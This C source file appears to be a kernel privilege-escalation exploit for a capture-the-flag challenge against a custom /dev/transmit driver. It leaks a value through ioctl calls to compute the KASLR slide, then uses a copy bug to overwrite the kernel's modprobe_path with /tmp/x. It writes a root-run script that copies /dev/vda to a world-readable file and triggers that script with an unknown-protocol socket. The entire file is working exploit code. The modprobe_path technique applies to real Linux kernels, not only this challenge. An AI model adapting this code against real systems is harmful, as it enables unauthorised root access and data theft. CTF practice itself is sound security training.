#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdlib.h>

#define PROC_MODPROBE_TRIGGER "/tmp/x"

#define CREATE_SESSION   0
#define DESTROY_SESSION  1
#define TEST_SESSION     2
#define TRANSMIT_FAST    3
#define TRANSMIT_NORMAL  4
#define COPY_DATA        5
#define READ_DATA        6
#define DELETE_DATA      7
#define MAX_SESSIONS     255

struct session {
    uint32_t id;
    void *data;
    uint64_t data_len;
    bool is_fast;
};

struct device_arg {
    uint32_t id;
    void *data;
    uint64_t data_len;
    uint32_t to_id;
    uint32_t from_id;
};
                      
void getflag(){
    puts("[*] Returned to userland, setting up for fake modprobe");
   
    system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");
}

int main(void) {
    puts("start exploit");    

    int fd = open("/dev/transmit", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    uint32_t ids[5] = {0} ;
    
    struct device_arg arg = {0};   
    for(int i = 0; i<3; i++){
        ids[i] = ioctl(fd, CREATE_SESSION, &arg);
        printf("ioctl result: 0x%x\n", ids[i]);
    }
    uint32_t ptr_low  = ((uint32_t)ids[0])* 0x66c88cc3U;
    uint32_t kaslr    = ptr_low - 0x8233cac0U;
    uint64_t kbase    = 0xffffffff81000000ULL + kaslr;

    printf("KASLR slide: %#x\n", kaslr);
    printf("kernel base: %#lx\n", (unsigned long)kbase);
    uint64_t modprobe = kbase + 0x10aeac0;
    printf("modprobe %#lx\n", (unsigned long)modprobe);

    char *normal_buf = "/tmp/x";

    struct device_arg normal = {0};
    normal.id       = ids[0];
    normal.data     = normal_buf;      
    normal.data_len = 7;

    int normal_rc= ioctl(fd, TRANSMIT_NORMAL, &normal);
    if(normal_rc != 0){
        puts("error transmit normal");
    }
    
    struct device_arg fast= {0};   
    fast.id  = ids[1];
    fast.data = (void*)modprobe;

    int fast_rc = ioctl(fd, TRANSMIT_FAST, &fast);
    if(fast_rc != 0){
        puts("error transmit fast");
    }

    struct device_arg copy= {0};   
    copy.from_id = ids[0];
    copy.to_id = ids[1];
    
    int rc_copy = ioctl(fd, COPY_DATA, &copy);

    if(rc_copy!=0){
      puts("failed copy trigger bug");
    }

    getflag();

    puts("end exploit");
    return 0;
}
